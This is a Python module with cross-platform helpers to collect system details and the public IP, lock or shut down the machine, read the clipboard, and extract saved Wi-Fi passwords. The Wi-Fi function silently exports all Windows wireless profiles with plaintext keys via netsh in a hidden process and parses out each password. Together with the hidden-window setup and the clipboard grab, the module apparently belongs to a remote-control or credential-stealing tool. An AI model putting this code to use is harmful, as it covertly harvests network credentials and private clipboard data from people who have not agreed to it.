"""System info, lock, shutdown, clipboard, WiFi passwords."""
import os
import re
import shutil
import platform
import subprocess
import pyperclip
from pathlib import Path

OS = platform.system()
_NO_WINDOW = 0x08000000 if OS == "Windows" else 0
_si = None
if OS == "Windows":
    _si = subprocess.STARTUPINFO()
    _si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    _si.wShowWindow = 0


def get_system_info():
    info = {
        "os": f"{OS} {platform.release()} ({platform.version()})",
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": platform.node(),
        "username": os.getlogin(),
    }
    try:
        import psutil
        info["cpu_percent"] = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        info["ram_total_gb"] = round(mem.total / (1024 ** 3), 1)
        info["ram_used_gb"] = round(mem.used / (1024 ** 3), 1)
        info["ram_percent"] = mem.percent
    except ImportError:
        pass
    return info


def get_public_ip():
    import requests
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "Unknown")
    except Exception:
        return "Unavailable"


def lock_screen():
    try:
        if OS == "Windows":
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"],
                           creationflags=_NO_WINDOW, startupinfo=_si)
        elif OS == "Darwin":
            subprocess.run(["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession", "-suspend"])
        elif OS == "Linux":
            if shutil.which("loginctl"):
                subprocess.run(["loginctl", "lock-session"])
        return True
    except Exception:
        return False


def shutdown():
    try:
        if OS == "Windows":
            subprocess.run(["shutdown", "/s", "/t", "5"],
                           creationflags=_NO_WINDOW, startupinfo=_si)
        elif OS == "Linux":
            subprocess.run(["systemctl", "poweroff"])
        elif OS == "Darwin":
            subprocess.run(["osascript", "-e", 'tell app "System Events" to shut down'])
        return True
    except Exception:
        return False


def get_clipboard():
    try:
        return pyperclip.paste()
    except Exception:
        return None


def get_wifi_passwords():
    profiles = []
    try:
        if OS == "Windows":
            export_folder = Path.home() / ".sc_wifi_tmp"
            export_folder.mkdir(exist_ok=True)
            subprocess.run(
                ["netsh", "wlan", "export", "profile", "key=clear", f"folder={export_folder}"],
                creationflags=_NO_WINDOW, startupinfo=_si,
            )
            for f in export_folder.glob("*.xml"):
                xml = f.read_text(errors="ignore")
                ssid = re.search(r"<name>(.*?)</name>", xml)
                key = re.search(r"<keyMaterial>(.*?)</keyMaterial>", xml)
                if ssid:
                    profiles.append({"ssid": ssid.group(1), "password": key.group(1) if key else "N/A"})
            shutil.rmtree(export_folder, ignore_errors=True)
    except Exception as e:
        profiles.append({"ssid": "Error", "password": str(e)})
    return profiles
